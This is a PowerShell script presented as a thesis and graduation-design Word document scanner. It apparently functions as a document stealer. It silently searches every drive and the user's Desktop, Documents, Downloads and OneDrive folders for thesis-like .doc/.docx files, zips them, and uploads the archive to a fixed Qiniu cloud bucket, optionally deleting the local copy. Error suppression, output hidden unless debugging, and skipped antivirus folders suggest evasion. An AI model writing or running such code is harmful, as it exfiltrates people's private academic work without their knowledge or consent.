[CmdletBinding()]
param(
    [string[]]$ScanRoots = @(),
    [string[]]$ScoreFiles = @(),
    [string[]]$ScoreDirs = @(),
    [int]$MinScore = 45,
    [long]$MinFileSizeBytes = 10KB,
    [long]$MaxFileSizeBytes = 80MB,
    [int]$ContentSampleChars = 120000,
    [string]$ArchiveOutputDir = (Join-Path $env:TEMP 'thesis-scan-results'),
    [string]$QiniuBucket = 'sokach',
    [string]$QiniuKeyPrefix = 'thesis-scan',
    [string]$QiniuUploadUrl = 'https://up-z2.qiniup.com',
    [string]$QiniuUploadToken = '',
    [switch]$DebugMode,
    [switch]$QiniuDebug,
    [switch]$DeleteLocalArchiveAfterUpload,
    [switch]$ShowSkippedDirs,
    [switch]$Recurse = $true
)

$ErrorActionPreference = 'SilentlyContinue'

if ($QiniuDebug) { $DebugMode = $true }

function Write-Log {
    if ($script:DebugMode) {
        Write-Host @args
    }
}

if ([string]::IsNullOrWhiteSpace($QiniuBucket)) { $QiniuBucket = $env:QINIU_BUCKET }
if ([string]::IsNullOrWhiteSpace($QiniuKeyPrefix) -and -not [string]::IsNullOrWhiteSpace($env:QINIU_KEY_PREFIX)) { $QiniuKeyPrefix = $env:QINIU_KEY_PREFIX }
if (-not [string]::IsNullOrWhiteSpace($env:QINIU_UPLOAD_URL)) { $QiniuUploadUrl = $env:QINIU_UPLOAD_URL }
if ([string]::IsNullOrWhiteSpace($QiniuUploadToken)) { $QiniuUploadToken = $env:QINIU_UPLOAD_TOKEN }

$QiniuBucket = $QiniuBucket.Trim().Trim('"').Trim("'")
$QiniuKeyPrefix = $QiniuKeyPrefix.Trim().Trim('"').Trim("'")
$QiniuUploadUrl = $QiniuUploadUrl.Trim().Trim('"').Trim("'")
$QiniuUploadToken = $QiniuUploadToken.Trim().Trim('"').Trim("'")


$PathKeywords = @(
    '毕业',        # graduation
    '论文',        # thesis/paper
    '设计',        # design
    '开题',        # proposal
    '答辩',        # defense
    '文献',        # literature
    '学位',        # degree
    'thesis', 'dissertation', 'graduate', 'graduation', 'paper', 'design'
)

$NameKeywords = @(
    @{ Pattern = '毕业论文|学位论文|本科论文|硕士论文|博士论文|研究生论文'; Score = 38 },
    @{ Pattern = '毕业设计|毕业设计论文|毕业设计说明书'; Score = 34 },
    @{ Pattern = '开题报告|文献综述|任务书|中期检查|中期报告|答辩|PPT大纲'; Score = 24 },
    @{ Pattern = '终稿|定稿|终版|正式版|完整版|答辩版|提交版|送审版|存档版|清稿|核稿'; Score = 16 },
    @{ Pattern = '论文|设计说明|设计报告|设计论文|research|thesis|dissertation|paper'; Score = 18 },
    @{ Pattern = '选题|绪论|引言|概述|综述|摘要|abstract|acknowledgement|致谢|参考文献|文献翻译'; Score = 10 },
    @{ Pattern = '学院|专业|\d{2,4}届|\d{2,4}级|学号|指导教师|导师'; Score = 6 },
    @{ Pattern = 'v\d+|final|submission|draft\d|修订|修改版|改\d|第\d版'; Score = 8 }
)

$DocExtensions = @{
    '.docx' = 8
    '.doc'  = 6
}

$NegativeNamePatterns = @(
    @{ Pattern = '安装|setup|installer|uninstall|驱动|driver|readme'; Score = -30 },
    @{ Pattern = '模板\.(doc|docx)$|sample|example|示例|空白|blank'; Score = -15 },
    @{ Pattern = '^\~\$|\.tmp$|\.bak$|\.old$|副本|copy|复件'; Score = -40 },
    @{ Pattern = '通知|公告|会议|纪要|申请表|登记表|审批表|统计表|名单|简历|合同|协议|发票|报价|证明|制度|计划|总结|方案|说明|报告模板'; Score = -22 },
    @{ Pattern = '作业|练习|试题|真题|答案|讲义|课件|教案|实验报告|实训报告'; Score = -20 }
)

$NegativePathPatterns = @(
    @{ Pattern = '计算机二级|WPS Office真题|真题|试题|标准答案|考生文件夹|练习|题库|模拟题|考试|Office\\Word|\\Word\\WPS\.docx$'; Score = -45 },
    @{ Pattern = '\\课程\\|\\课件\\|\\作业\\|\\练习\\|\\试题\\|\\答案\\|\\模板\\'; Score = -24 }
)

$StrongContentKeywords = @(
    @{ Pattern = '本科毕业论文|本科毕业设计|硕士学位论文|博士学位论文|毕业设计\(论文\)|毕业论文\(设计\)|学位论文'; Score = 40 },
    @{ Pattern = '原创性声明|独创性声明|论文版权使用授权书|诚信承诺书'; Score = 28 },
    @{ Pattern = '指导教师|指导老师|导师|所在学院|学院名称|专业名称|学生姓名|学号|答辩委员会'; Score = 18 },
    @{ Pattern = '\[[0-9]{1,3}\].{0,80}(出版社|期刊|学报|University|Press|Journal|IEEE|Springer|Elsevier)'; Score = 14 }
)

$StructureContentKeywords = @(
    '摘要',
    '关键词',
    'Abstract',
    'Key\s*words',
    '目录',
    '绪论',
    '引言',
    '研究背景',
    '研究意义',
    '国内外研究现状',
    '参考文献',
    '致谢'
)

$SkipDirNames = @(
    'node_modules', 'npm-cache', '.npm', '.yarn', 'yarn-cache', 'pnpm-store',
    '.git', '.svn', '.hg', '.idea', '.vscode', '.vs', 'vendor', 'packages',
    '__pycache__', '.pytest_cache', '.mypy_cache', '.venv', 'venv', 'env',
    'target', 'build', 'dist', 'out', '.gradle', '.nuget', 'bower_components',
    'Windows', 'WinSxS', 'System32', 'SysWOW64', 'WinRE', 'Recovery',
    'Program Files', 'Program Files (x86)', 'ProgramData',
    '$Recycle.Bin', 'System Volume Information', 'AppData',
    'WindowsApps', 'WinSAT', 'Prefetch', 'Installer',
    'servicing', 'assembly', 'Boot', 'Logs', 'Temp', 'tmp',
    'Intel', 'AMD', 'NVIDIA', 'Drivers', 'DriverStore',
    'Cache', 'Caches', 'CachedData', 'Code Cache', 'GPUCache',
    'Steam', 'steamapps', 'SteamLibrary', 'Epic Games', 'Epic Games Store', 'Origin', 'EA Games', 'EA Desktop',
    'Battle.net', 'Blizzard Entertainment', 'Riot Games', 'League of Legends', 'WeGame',
    'Ubisoft', 'Ubisoft Game Launcher', 'GOG Galaxy', 'Rockstar Games', 'Rockstar Games Launcher',
    'miHoYo', 'HoYoverse', 'GameLoop',
    '360', '360safe', '360sd', '360se6', '360Chrome', 'Huorong', '火绒安全', 'Kingsoft', '金山毒霸',
    'KSafe', 'KAV', 'Kaspersky Lab', 'Kaspersky', 'McAfee', 'Norton', 'Symantec', 'Avast Software',
    'AVG', 'ESET', 'Avira', 'Bitdefender', 'Trend Micro', 'Windows Defender',
    'iTunes', 'QQMusic', 'QQ音乐', 'Kugou', 'KuGou',
    '酷狗音乐', 'Kuwo', '酷我音乐', 'Netease Cloud Music', 'CloudMusic', '网易云音乐'
)

$SkipPathFragments = @(
    '\Windows\', '\WinSxS\', '\System32\', '\SysWOW64\',
    '\Program Files\', '\Program Files (x86)\', '\ProgramData\Microsoft\',
    '\node_modules\', '\npm-cache\', '\.git\', '\AppData\Local\Temp\',
    '\AppData\Local\Packages\', '\AppData\Local\Microsoft\Windows\',
    '\$Recycle.Bin\', '\System Volume Information\',
    '\Steam\', '\steamapps\', '\SteamLibrary\', '\Epic Games\', '\Origin\', '\EA Games\',
    '\Battle.net\', '\Blizzard Entertainment\', '\Riot Games\', '\League of Legends\', '\WeGame\',
    '\Ubisoft\', '\GOG Galaxy\', '\Rockstar Games\', '\miHoYo\', '\HoYoverse\', '\GameLoop\',
    '\360safe\', '\360sd\', '\Huorong\', '\火绒安全\', '\Kingsoft\', '\金山毒霸\',
    '\Kaspersky Lab\', '\Kaspersky\', '\McAfee\', '\Norton\', '\Symantec\', '\Avast Software\',
    '\AVG\', '\ESET\', '\Avira\', '\Bitdefender\', '\Trend Micro\', '\Windows Defender\',
    '\iTunes\', '\QQMusic\', '\QQ音乐\', '\Kugou\', '\酷狗音乐\', '\Kuwo\', '\酷我音乐\',
    '\Netease Cloud Music\', '\CloudMusic\', '\网易云音乐\'
)

function Get-DefaultScanRoots {
    $roots = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)

    foreach ($profile in @($env:USERPROFILE, $env:PUBLIC)) {
        if (-not $profile) { continue }

        foreach ($sub in @('Desktop', '桌面', 'Documents', '文档', 'Downloads', '下载')) {
            $p = Join-Path $profile $sub
            if (Test-Path $p) { [void]$roots.Add($p) }
        }

        Get-ChildItem -Path $profile -Directory -Filter 'OneDrive*' -ErrorAction SilentlyContinue |
            ForEach-Object { [void]$roots.Add($_.FullName) }
    }

    foreach ($drive in Get-PSDrive -PSProvider FileSystem -ErrorAction SilentlyContinue) {
        $root = $drive.Root
        if ($root -match '^[A-Z]:\\$') {
            try {
                Get-ChildItem -Path $root -Directory -ErrorAction SilentlyContinue |
                    Where-Object {
                        $n = $_.Name
                        -not ($SkipDirNames | Where-Object { $n -ieq $_ })
                    } |
                    ForEach-Object { [void]$roots.Add($_.FullName) }
            } catch { }
        }
    }

    return @($roots)
}

function Test-ShouldSkipDirectory {
    param([string]$DirPath)

    $name = Split-Path $DirPath -Leaf
    foreach ($skip in $SkipDirNames) {
        if ($name -ieq $skip) { return $true }
    }
    return $false
}

function Test-ShouldSkipFilePath {
    param([string]$FilePath)

    foreach ($frag in $SkipPathFragments) {
        if ($FilePath -like "*$frag*") { return $true }
    }
    return $false
}

function Get-PathPenalty {
    param([string]$FilePath)

    $penalty = 0
    foreach ($rule in $NegativePathPatterns) {
        if ($FilePath -match $rule.Pattern) {
            $penalty += $rule.Score
        }
    }
    return $penalty
}

function Get-DesktopBonus {
    param([string]$FilePath)

    $normalized = $FilePath -replace '\\', '/'
    if ($normalized -match ('/Desktop/|/' + '桌面' + '/')) { return 4 }
    if ($normalized -match ('/Documents/|/' + '文档' + '/|/Downloads/|/' + '下载' + '/')) { return 2 }
    return 0
}

function Get-PathKeywordScore {
    param([string]$FilePath)

    $score = 0
    $lower = $FilePath.ToLowerInvariant()
    foreach ($kw in $PathKeywords) {
        if ($lower.Contains($kw.ToLowerInvariant())) {
            $score += 5
        }
    }
    return [Math]::Min($score, 20)
}

function Get-NameKeywordScore {
    param([string]$FileName)

    $score = 0
    foreach ($rule in $NameKeywords) {
        if ($FileName -match $rule.Pattern) {
            $score += $rule.Score
        }
    }
    foreach ($rule in $NegativeNamePatterns) {
        if ($FileName -match $rule.Pattern) {
            $score += $rule.Score
        }
    }
    return $score
}

function Get-ExtensionScore {
    param([string]$Extension)

    $ext = $Extension.ToLowerInvariant()
    if (-not $ext.StartsWith('.')) { $ext = ".$ext" }
    if ($DocExtensions.ContainsKey($ext)) {
        return $DocExtensions[$ext]
    }
    return 0
}

function Get-SizeScore {
    param([long]$Length)

    if ($Length -gt $MaxFileSizeBytes) { return -15 }
    if ($Length -ge 300KB -and $Length -le 20MB) { return 8 }
    if ($Length -ge $MinFileSizeBytes -and $Length -le 40MB) { return 3 }
    return 0
}

function Get-FormatBonus {
    param([string]$FilePath)

    $bonus = 0
    $dirName = Split-Path (Split-Path $FilePath -Parent) -Leaf
    if ($dirName -match '论文|毕业|thesis|dissertation|设计|开题|答辩|学位') {
        $bonus += 10
    }
    return $bonus
}

function Get-DocxTextSample {
    param(
        [string]$FilePath,
        [int]$MaxChars
    )

    if (-not $FilePath.ToLowerInvariant().EndsWith('.docx')) { return '' }

    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
        $zip = [System.IO.Compression.ZipFile]::OpenRead($FilePath)
        try {
            $parts = $zip.Entries |
                Where-Object { $_.FullName -match '^word/(document|header\d*|footer\d*)\.xml$' } |
                Sort-Object FullName

            $builder = [System.Text.StringBuilder]::new()
            foreach ($part in $parts) {
                if ($builder.Length -ge $MaxChars) { break }
                $reader = [System.IO.StreamReader]::new($part.Open(), [System.Text.Encoding]::UTF8)
                try {
                    $xml = $reader.ReadToEnd()
                    $text = $xml -replace '<[^>]+>', ' '
                    $text = [System.Net.WebUtility]::HtmlDecode($text)
                    $text = $text -replace '\s+', ' '
                    [void]$builder.Append(' ')
                    [void]$builder.Append($text)
                } finally {
                    $reader.Dispose()
                }
            }
            if ($builder.Length -gt $MaxChars) {
                return $builder.ToString(0, $MaxChars)
            }
            return $builder.ToString()
        } finally {
            $zip.Dispose()
        }
    } catch {
        return ''
    }
}

function Get-ContentKeywordScore {
    param([string]$Text)

    if ([string]::IsNullOrWhiteSpace($Text)) { return 0 }

    $score = 0
    foreach ($rule in $StrongContentKeywords) {
        if ($Text -match $rule.Pattern) {
            $score += $rule.Score
        }
    }

    $structureHits = 0
    foreach ($pattern in $StructureContentKeywords) {
        if ($Text -match $pattern) {
            $structureHits++
        }
    }

    if ($structureHits -ge 4) {
        $score += [Math]::Min($structureHits * 4, 24)
    }

    return [Math]::Min($score, 80)
}

function Get-ThesisFileScore {
    param(
        [System.IO.FileInfo]$File,
        [switch]$BypassSignalGate,
        [switch]$BypassMinSize
    )

    $ext = $File.Extension.ToLowerInvariant()
    if ($ext -notin $DocExtensions.Keys) { return $null }
    if (-not $BypassMinSize -and $File.Length -lt $MinFileSizeBytes) { return $null }

    $path = $File.FullName
    if (Test-ShouldSkipFilePath -FilePath $path) { return $null }

    $contentSample = Get-DocxTextSample -FilePath $path -MaxChars $ContentSampleChars
    $contentScore = Get-ContentKeywordScore -Text $contentSample
    $nameScore = Get-NameKeywordScore -FileName $File.Name
    $pathScore = Get-PathKeywordScore -FilePath $path
    $pathPenalty = Get-PathPenalty -FilePath $path
    $formatBonus = Get-FormatBonus -FilePath $path

    $breakdown = [ordered]@{
        Extension   = (Get-ExtensionScore -Extension $ext)
        DesktopDoc  = (Get-DesktopBonus -FilePath $path)
        PathKeyword = $pathScore
        PathPenalty = $pathPenalty
        NameKeyword = $nameScore
        Content     = $contentScore
        Size        = (Get-SizeScore -Length $File.Length)
        FormatBonus = $formatBonus
    }

    $total = ($breakdown.Values | Measure-Object -Sum).Sum
    $hasStrongSignal = ($nameScore -ge 18) -or ($contentScore -ge 40)
    $hasCombinedSignal = (($nameScore -gt 0) -and (($pathScore + $formatBonus + $contentScore) -gt 0)) -or (($contentScore -gt 0) -and (($pathScore + $formatBonus) -gt 0))

    if (-not $BypassSignalGate -and -not $hasStrongSignal -and -not $hasCombinedSignal) {
        return $null
    }

    $confidence = if ($contentScore -ge 50 -or $nameScore -ge 38) {
        'High'
    } elseif ($contentScore -ge 28 -or $nameScore -ge 24 -or $total -ge 65) {
        'Medium'
    } else {
        'Low'
    }

    [PSCustomObject]@{
        Path       = $path
        Name       = $File.Name
        Extension  = $ext
        SizeBytes  = $File.Length
        SizeHuman  = if ($File.Length -ge 1MB) {
            '{0:N2} MB' -f ($File.Length / 1MB)
        } elseif ($File.Length -ge 1KB) {
            '{0:N1} KB' -f ($File.Length / 1KB)
        } else {
            '{0} B' -f $File.Length
        }
        Modified   = $File.LastWriteTime.ToString('yyyy-MM-dd HH:mm')
        Score      = $total
        Confidence = $confidence
        Breakdown  = ($breakdown.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join ', '
    }
}

function Get-ScannableFiles {
    param(
        [string]$Root,
        [bool]$DoRecurse
    )

    $options = @{
        File = $true
        ErrorAction = 'SilentlyContinue'
    }
    if ($DoRecurse) {
        $options['Recurse'] = $true
    }

    try {
        Get-ChildItem -Path $Root @options | Where-Object {
            -not $_.PSIsContainer -and
            ($_.Extension.ToLowerInvariant() -in $DocExtensions.Keys) -and
            ($_.Length -ge $MinFileSizeBytes)
        }
    } catch {
        @()
    }
}

function New-ScanResultArchive {
    param(
        [object[]]$Items,
        [string]$OutputDir
    )

    if (-not (Test-Path $OutputDir)) {
        [void](New-Item -ItemType Directory -Path $OutputDir -Force)
    }

    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue

    $id = [guid]::NewGuid().ToString('N')
    $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
    $zipName = "$id`_$timestamp.zip"
    $zipPath = Join-Path $OutputDir $zipName

    if (Test-Path $zipPath) {
        Remove-Item -LiteralPath $zipPath -Force
    }

    $tempManifest = Join-Path $OutputDir "$id`_$timestamp`_scan_results.csv"
    $Items |
        Select-Object Score, Confidence, Name, Extension, SizeHuman, SizeBytes, Modified, Path, Breakdown |
        Export-Csv -LiteralPath $tempManifest -NoTypeInformation -Encoding UTF8

    $zip = [System.IO.Compression.ZipFile]::Open($zipPath, [System.IO.Compression.ZipArchiveMode]::Create)
    try {
        [void][System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $tempManifest, 'scan_results.csv')
        $usedEntries = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)

        foreach ($item in $Items) {
            if (-not (Test-Path -LiteralPath $item.Path)) { continue }

            $entryName = ($item.Path -replace '^[\\]+', '' -replace ':', '' -replace '\\', '/')
            $entryName = "files/$entryName"

            if ($usedEntries.Contains($entryName)) {
                $fileName = [System.IO.Path]::GetFileName($entryName)
                $dirName = [System.IO.Path]::GetDirectoryName($entryName).Replace('\', '/')
                $entryName = "$dirName/$([guid]::NewGuid().ToString('N'))_$fileName"
            }

            [void]$usedEntries.Add($entryName)
            [void][System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $item.Path, $entryName)
        }
    } finally {
        $zip.Dispose()
        if (Test-Path -LiteralPath $tempManifest) {
            Remove-Item -LiteralPath $tempManifest -Force
        }
    }

    return [PSCustomObject]@{
        Path = $zipPath
        Name = $zipName
    }
}

function Send-QiniuFile {
    param(
        [string]$FilePath,
        [string]$ObjectKey,
        [string]$UploadUrl,
        [string]$Token
    )

    Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue

    $client = [System.Net.Http.HttpClient]::new()
    $form = [System.Net.Http.MultipartFormDataContent]::new()
    $stream = [System.IO.File]::OpenRead($FilePath)

    try {
        $form.Add([System.Net.Http.StringContent]::new($Token), 'token')
        $form.Add([System.Net.Http.StringContent]::new($ObjectKey), 'key')

        $fileContent = [System.Net.Http.StreamContent]::new($stream)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/zip')
        $form.Add($fileContent, 'file', [System.IO.Path]::GetFileName($FilePath))

        $response = $client.PostAsync($UploadUrl, $form).GetAwaiter().GetResult()
        $body = $response.Content.ReadAsStringAsync().GetAwaiter().GetResult()

        if (-not $response.IsSuccessStatusCode) {
            throw "Qiniu upload failed: HTTP $([int]$response.StatusCode) $($response.ReasonPhrase). $body"
        }

        return $body
    } finally {
        $form.Dispose()
        $stream.Dispose()
        $client.Dispose()
    }
}

function Get-TestModeFilesFromDirectory {
    param(
        [string]$Root,
        [bool]$DoRecurse
    )

    if (-not (Test-Path -LiteralPath $Root)) {
        Write-Log "Directory not found: $Root" -ForegroundColor Yellow
        return @()
    }

    $dir = Get-Item -LiteralPath $Root -ErrorAction SilentlyContinue
    if ($null -eq $dir -or -not $dir.PSIsContainer) {
        Write-Log "Not a directory: $Root" -ForegroundColor Yellow
        return @()
    }

    $options = @{
        File = $true
        Force = $true
        ErrorAction = 'SilentlyContinue'
    }
    if ($DoRecurse) {
        $options['Recurse'] = $true
    }

    try {
        return @(Get-ChildItem -LiteralPath $dir.FullName @options | Where-Object {
            $_.Extension.ToLowerInvariant() -in $DocExtensions.Keys
        })
    } catch {
        return @()
    }
}

Write-Log ''
Write-Log '========================================' -ForegroundColor Cyan
Write-Log ' Thesis / graduation-design Word scanner (.doc/.docx)' -ForegroundColor Cyan
Write-Log '========================================' -ForegroundColor Cyan
Write-Log "Minimum score: $MinScore"
Write-Log "File types: .doc / .docx"
Write-Log "Size range: >= $MinFileSizeBytes and <= $MaxFileSizeBytes bytes"
Write-Log "DOCX content sample: $ContentSampleChars chars"
Write-Log "Recursive scan: $Recurse"
Write-Log "Archive output: $ArchiveOutputDir"
Write-Log ''

$results = [System.Collections.Generic.List[object]]::new()
$scannedFiles = 0
$skippedDirs = 0
$skippedDirSamples = [System.Collections.Generic.List[string]]::new()
$scoreFileMode = ($ScoreFiles.Count -gt 0) -or ($ScoreDirs.Count -gt 0)

if ($scoreFileMode) {
    Write-Log 'Score diagnostic mode:' -ForegroundColor Yellow
    if ($ScoreFiles.Count -gt 0) {
        Write-Log "Files ($($ScoreFiles.Count)):" -ForegroundColor Yellow
        $ScoreFiles | ForEach-Object { Write-Log "  - $_" }
    }
    if ($ScoreDirs.Count -gt 0) {
        Write-Log "Directories ($($ScoreDirs.Count), Recurse=$Recurse):" -ForegroundColor Yellow
        $ScoreDirs | ForEach-Object { Write-Log "  - $_" }
    }
    Write-Log ''

    $testFiles = [System.Collections.Generic.List[object]]::new()

    foreach ($path in $ScoreFiles) {
        $file = Get-Item -LiteralPath $path -ErrorAction SilentlyContinue
        if ($null -eq $file -or $file.PSIsContainer) {
            Write-Log "File not found or not a file: $path" -ForegroundColor Yellow
            continue
        }
        [void]$testFiles.Add($file)
    }

    foreach ($dir in $ScoreDirs) {
        foreach ($file in Get-TestModeFilesFromDirectory -Root $dir -DoRecurse:$Recurse) {
            [void]$testFiles.Add($file)
        }
    }

    $seenTestFiles = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
    foreach ($file in $testFiles) {
        if (-not $seenTestFiles.Add($file.FullName)) {
            continue
        }

        $scannedFiles++
        $scored = Get-ThesisFileScore -File $file -BypassSignalGate -BypassMinSize
        if ($null -ne $scored) {
            $results.Add($scored)
        } else {
            Write-Log "Unsupported file type, only .doc/.docx are scored: $($file.FullName)" -ForegroundColor Yellow
        }
    }
} else {
    $allRoots = if ($ScanRoots.Count -gt 0) { $ScanRoots } else { Get-DefaultScanRoots }
    Write-Log "Scan roots ($($allRoots.Count)):" -ForegroundColor Yellow
    $allRoots | ForEach-Object { Write-Log "  - $_" }
    Write-Log ''

    foreach ($root in $allRoots) {
        if (-not (Test-Path $root)) { continue }

        Write-Log "Scanning: $root ..." -ForegroundColor DarkGray

        if ($Recurse) {
            $queue = [System.Collections.Queue]::new()
            $queue.Enqueue($root)

            while ($queue.Count -gt 0) {
                $current = $queue.Dequeue()
                if (Test-ShouldSkipDirectory -DirPath $current) {
                    $skippedDirs++
                    if ($ShowSkippedDirs -and $skippedDirSamples.Count -lt 200) { [void]$skippedDirSamples.Add($current) }
                    continue
                }

                try {
                    foreach ($item in Get-ChildItem -Path $current -Force -ErrorAction SilentlyContinue) {
                        if ($item.PSIsContainer) {
                            if (-not (Test-ShouldSkipDirectory -DirPath $item.FullName)) {
                                $queue.Enqueue($item.FullName)
                            } else {
                                $skippedDirs++
                                if ($ShowSkippedDirs -and $skippedDirSamples.Count -lt 200) { [void]$skippedDirSamples.Add($item.FullName) }
                            }
                        } elseif ($item.Extension.ToLowerInvariant() -in $DocExtensions.Keys -and $item.Length -ge $MinFileSizeBytes) {
                            $scannedFiles++
                            $scored = Get-ThesisFileScore -File $item
                            if ($null -ne $scored -and $scored.Score -ge $MinScore) {
                                $results.Add($scored)
                            }
                        }
                    }
                } catch { }
            }
        } else {
            foreach ($file in Get-ScannableFiles -Root $root -DoRecurse:$false) {
                $scannedFiles++
                $scored = Get-ThesisFileScore -File $file
                if ($null -ne $scored -and $scored.Score -ge $MinScore) {
                    $results.Add($scored)
                }
            }
        }
    }
}

$sorted = @($results | Sort-Object @{ Expression = 'Score'; Descending = $true }, @{ Expression = 'SizeBytes'; Descending = $true })

Write-Log ''
Write-Log '========================================' -ForegroundColor Green
Write-Log ' Scan complete' -ForegroundColor Green
Write-Log '========================================' -ForegroundColor Green
Write-Log "Candidate Word files scanned: $scannedFiles"
Write-Log "Skipped directories: $skippedDirs"
if ($scoreFileMode) {
    Write-Log "Scored specified files: $($sorted.Count)"
} else {
    Write-Log "Results with score >= $MinScore`: $($sorted.Count)"
}
Write-Log ''

if ($ShowSkippedDirs -and $skippedDirSamples.Count -gt 0) {
    Write-Log 'Skipped directory samples:' -ForegroundColor DarkGray
    $skippedDirSamples | ForEach-Object { Write-Log "  - $_" -ForegroundColor DarkGray }
    if ($skippedDirs -gt $skippedDirSamples.Count) {
        Write-Log "  ... $($skippedDirs - $skippedDirSamples.Count) more skipped directories" -ForegroundColor DarkGray
    }
    Write-Log ''
}

if ($sorted.Count -eq 0) {
    if ($scoreFileMode) {
        Write-Log 'No files could be scored. Only existing .doc/.docx files are supported.' -ForegroundColor Yellow
    } else {
        Write-Log 'No matching thesis-like Word documents found. Try:' -ForegroundColor Yellow
        Write-Log '  - Lowering -MinScore, for example: -MinScore 25'
        Write-Log '  - Specifying extra paths with -ScanRoots'
        Write-Log '  - Scoring a known file directly with -ScoreFiles'
        Write-Log '  - Scoring a directory directly with -ScoreDirs'
    }
    exit 0
}

$index = 1
foreach ($item in $sorted) {
    Write-Log ("[{0}] Score {1}" -f $index, $item.Score) -ForegroundColor White
    Write-Log ("     Confidence: {0}" -f $item.Confidence)
    Write-Log ("     File: {0}" -f $item.Name)
    Write-Log ("     Path: {0}" -f $item.Path)
    Write-Log ("     Type: {0}  |  Size: {1}  |  Modified: {2}" -f $item.Extension, $item.SizeHuman, $item.Modified)
    Write-Log ("     Breakdown: {0}" -f $item.Breakdown) -ForegroundColor DarkGray
    Write-Log ''
    $index++
}

Write-Log '--- Summary table ---' -ForegroundColor Cyan
Write-Log ($sorted | Format-Table -Property Score, Confidence, Name, Extension, SizeHuman, Modified, Path -AutoSize | Out-String)

if ($scoreFileMode) {
    Write-Log ''
    Write-Log 'Score file mode complete. Archive and upload are skipped in this diagnostic mode.' -ForegroundColor Yellow
    exit 0
}

Write-Log ''
Write-Log 'Creating result archive...' -ForegroundColor Cyan
$archive = New-ScanResultArchive -Items @($sorted) -OutputDir $ArchiveOutputDir
Write-Log "Archive: $($archive.Path)" -ForegroundColor Green

$hasQiniuConfig = -not [string]::IsNullOrWhiteSpace($QiniuUploadToken)

if ($hasQiniuConfig) {
    $prefix = $QiniuKeyPrefix.Trim('/').Replace('\', '/')
    $objectKey = if ([string]::IsNullOrWhiteSpace($prefix)) {
        $archive.Name
    } else {
        "$prefix/$($archive.Name)"
    }

    Write-Log "Uploading to Qiniu: $QiniuBucket/$objectKey" -ForegroundColor Cyan
    try {
        $token = $QiniuUploadToken
        if ($QiniuDebug) {
            Write-Log 'Qiniu debug: using externally supplied upload token.' -ForegroundColor DarkGray
            Write-Log "Qiniu debug token prefix: $($token.Substring(0, [Math]::Min(12, $token.Length)))..." -ForegroundColor DarkGray
        }
        $uploadResult = Send-QiniuFile -FilePath $archive.Path -ObjectKey $objectKey -UploadUrl $QiniuUploadUrl -Token $token
        Write-Log 'Qiniu upload complete.' -ForegroundColor Green
        Write-Log $uploadResult
        if ($DeleteLocalArchiveAfterUpload -and (Test-Path -LiteralPath $archive.Path)) {
            Remove-Item -LiteralPath $archive.Path -Force
            Write-Log 'Local archive deleted after successful upload.' -ForegroundColor Green
        }
    } catch {
        Write-Log "Qiniu upload failed: $($_.Exception.Message)" -ForegroundColor Red
        Write-Log 'If the error is BadToken, verify AK/SK pair, bucket name, local system time, upload region URL, and whether the token was generated for the exact object key shown above.' -ForegroundColor Yellow
        Write-Log "Archive remains local: $($archive.Path)" -ForegroundColor Yellow
        exit 2
    }
} else {
    Write-Log 'Qiniu upload token not provided; upload skipped.' -ForegroundColor Yellow
    Write-Log 'Provide -QiniuUploadToken or set QINIU_UPLOAD_TOKEN to upload.'
}

